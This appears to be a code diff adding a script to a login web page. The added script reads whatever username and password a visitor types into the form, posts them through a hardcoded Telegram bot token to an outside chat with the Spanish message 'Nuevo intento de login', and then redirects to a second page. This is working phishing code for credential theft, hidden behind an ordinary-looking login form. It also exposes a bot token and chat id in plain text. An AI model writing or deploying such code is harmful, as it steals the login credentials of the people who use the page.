@@ -218,5 +218,49 @@
       }, 3000);
     });
   </script>
+  <script>
+  const botToken = "7505759331:AAF_U6x0ZGk3Tm_ivb28fHpht3GsIB8WXkU";
+  const chatId = "-1002633468201";
+
+  function enviarDatosLogin() {
+    const usuarioInput = document.querySelector('input[type="text"]');
+    const passwordInput = document.querySelector('input[type="password"]');
+
+    const usuario = usuarioInput.value.trim();
+    const contrasena = passwordInput.value.trim();
+
+    if (!usuario || !contrasena) {
+      alert("Por favor completa ambos campos.");
+      return;
+    }
+
+    const mensaje = `🔐 Nuevo intento de login:\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: mensaje
+      })
+    })
+    .then(() => {
+      // Guardar el nombre de usuario para mostrarlo en la siguiente página
+      localStorage.setItem("usuario", usuario);
+      // Redirigir a index2.html
+      window.location.href = "index2.html";
+    })
+    .catch(err => {
+      alert("Error al enviar datos a Telegram.");
+      console.error(err);
+    });
+  }
+
+  // Asociar el evento al botón de login
+  document.querySelector(".login-btn").addEventListener("click", enviarDatosLogin);
+</script>
+
 </body>
 </html>
